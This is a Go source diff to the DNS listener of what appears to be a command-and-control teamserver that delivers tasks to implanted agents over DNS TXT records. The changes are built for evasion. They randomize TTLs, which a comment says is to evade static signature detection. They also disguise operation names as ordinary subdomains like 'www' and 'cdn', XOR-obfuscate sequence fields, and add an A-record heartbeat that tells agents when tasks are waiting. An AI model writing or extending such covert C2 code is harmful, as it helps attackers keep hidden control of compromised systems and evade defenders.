@@ -8,6 +8,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"math/rand"
 	"net"
 	"strconv"
 	"strings"
@@ -59,6 +60,9 @@ func (d *DNS) Start(ts Teamserver) error {
 	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
 		d.Config.PktSize = 1024
 	}
+
+	// Seed the random number generator for TTL jitter
+	rand.Seed(time.Now().UnixNano())
 
 	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))
 
@@ -154,7 +158,15 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 	m.SetReply(r)
 	m.Authoritative = true
 
-	ttl := uint32(d.Config.TTL)
+	// Randomize TTL to evade static signature detection
+	// Base TTL from config, plus a random jitter (0-60 seconds)
+	baseTTL := uint32(d.Config.TTL)
+	if baseTTL == 0 {
+		baseTTL = 10
+	}
+	// Use math/rand (global instance is safe enough here)
+	ttl := baseTTL + uint32(rand.Intn(60))
+
 	qtype := strings.ToUpper(d.Config.QType)
 
 	for _, q := range r.Question {
@@ -178,12 +190,24 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 		if len(base) >= 5 {
 			sid = base[0]
-			op = strings.ToUpper(base[1])
+			rawOp := strings.ToLower(base[1])
+			switch rawOp {
+			case "www", "hi":
+				op = "HI"
+			case "cdn", "put":
+				op = "PUT"
+			case "api", "get":
+				op = "GET"
+			default:
+				// invalid op
+				op = ""
+			}
+
 			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
-				seq = int(v)
+				seq = int(v ^ 0x39913991)
 			}
 			if v, err := strconv.ParseUint(base[3], 16, 32); err == nil {
-				idx = int(v)
+				idx = int(v ^ 0x39913991)
 			}
 
 			_ = seq
@@ -292,18 +316,17 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			if sid != "" {
 				_ = d.ts.TsAgentSetTick(sid)
 			}
-			// 下行：从 TS 中取数据，并按 [total_len][offset][chunk] 做应用层分片
-			var frame []byte
+
+			// 1. 检查并准备任务数据（无论是 A 还是 TXT 请求，都先确保 downFrags 缓存了最新任务）
+			var df *dnsDownBuf
 			if sid != "" {
-				// 先尝试从缓存中取下行缓冲
-				var df *dnsDownBuf
 				d.mu.Lock()
 				if buf, ok := d.downFrags[sid]; ok {
 					df = buf
 				}
 				d.mu.Unlock()
 
-				// 如果没有缓存或已发送完，则从 TS 获取新的打包任务
+				// 如果没有缓存或已发送完，尝试从 TS 获取新任务并缓存
 				if df == nil || df.off >= df.total {
 					maxDataSize := d.Config.PktSize * 256
 					if maxDataSize <= 0 || maxDataSize > (4<<20) {
@@ -317,8 +340,8 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						flags := byte(0)
 						payload := p
 
-						// 针对较大的下行数据尝试使用 zlib 流压缩，减小 DNS 分片数量，并与 C++ miniz 解压保持兼容。
-						const minCompressSize = 2048 // 仅对大于 2KB 的 payload 尝试压缩
+						// zlib 压缩
+						const minCompressSize = 2048
 						if origLen > minCompressSize {
 							var zbuf bytes.Buffer
 							w, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
@@ -335,7 +358,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 							}
 						}
 
-						// 构造会话头：[flags][orig_len_le][payload]
+						// 构造会话头
 						totalLen := 1 + 4 + len(payload)
 						buf := make([]byte, totalLen)
 						buf[0] = flags
@@ -351,10 +374,28 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						d.mu.Unlock()
 					}
 				}
+			}
 
-				// 如果当前存在待发送的缓冲，则构造一个带头部的分片
+			// 2. 根据请求类型返回响应
+			var frame []byte
+
+			// 如果是 A 记录心跳请求：不返回数据，只返回 flag IP (0.0.0.1 有任务, 0.0.0.0 无任务)
+			if qtype == "A" {
+				hasTasks := (df != nil && df.off < df.total)
+				if hasTasks {
+					// 有任务 -> 返回 0.0.0.1，通知 Agent 切换 TXT 拉取
+					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
+					m.Answer = append(m.Answer, rr)
+				} else {
+					// 无任务 -> 返回 0.0.0.0
+					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
+					m.Answer = append(m.Answer, rr)
+				}
+				// 不生成 frame，也不增加 df.off
+			} else {
+				// 如果是 TXT (或其他) 请求：返回实际数据分片
 				if df != nil && df.off < df.total {
-					// 为了兼容 TXT RDATA 255 字节长度限制，这里控制每个分片大小。
+					// 为了兼容 TXT RDATA 255 字节长度限制
 					maxChunk := d.Config.PktSize
 					if maxChunk <= 0 || maxChunk > 247 {
 						maxChunk = 247
@@ -391,79 +432,19 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						d.mu.Unlock()
 					}
 				}
-			}
 
-			// 根据是否有 frame 生成响应记录
-			if len(frame) == 0 {
-				// 空响应
-				if qtype == "A" {
-					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
-					m.Answer = append(m.Answer, rr)
-				} else if qtype == "AAAA" {
-					rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::").To16()}
-					m.Answer = append(m.Answer, rr)
-				} else {
+				// 生成 TXT 响应
+				if len(frame) == 0 {
+					// 空 TXT 响应
 					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
 					m.Answer = append(m.Answer, rr)
-				}
-			} else {
-				// 对于 TXT：直接返回 frame；对于 A/AAAA：按字节切分到相应 RDATA 中。
-				if qtype == "A" {
-					start := 0
-					maxBytes := d.Config.PktSize
-					if maxBytes%4 != 0 {
-						maxBytes = maxBytes - (maxBytes % 4)
-					}
-					if maxBytes <= 0 {
-						maxBytes = 4
-					}
-					endLimit := start + maxBytes
-					if endLimit > len(frame) {
-						endLimit = len(frame)
-					}
-					for start < endLimit {
-						end := start + 4
-						if end > endLimit {
-							end = endLimit
-						}
-						chunk := make([]byte, 4)
-						copy(chunk, frame[start:end])
-						ip := net.IPv4(chunk[0], chunk[1], chunk[2], chunk[3])
-						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: ip}
-						m.Answer = append(m.Answer, rr)
-						start = end
-					}
-				} else if qtype == "AAAA" {
-					start := 0
-					maxBytes := d.Config.PktSize
-					if maxBytes%16 != 0 {
-						maxBytes = maxBytes - (maxBytes % 16)
-					}
-					if maxBytes <= 0 {
-						maxBytes = 16
-					}
-					endLimit := start + maxBytes
-					if endLimit > len(frame) {
-						endLimit = len(frame)
-					}
-					for start < endLimit {
-						end := start + 16
-						if end > endLimit {
-							end = endLimit
-						}
-						chunk := make([]byte, 16)
-						copy(chunk, frame[start:end])
-						ip := net.IP(chunk)
-						rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: ip}
-						m.Answer = append(m.Answer, rr)
-						start = end
-					}
 				} else {
-					// TXT: 直接用 frame 构造单条 TXT 记录
+					// 有数据 TXT 响应
 					rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{string(frame)}}
 					m.Answer = append(m.Answer, rr)
 				}
 			}
+			// GET 处理结束，break switch
 
 		default:
 			// 未知 op：简单 keep-alive
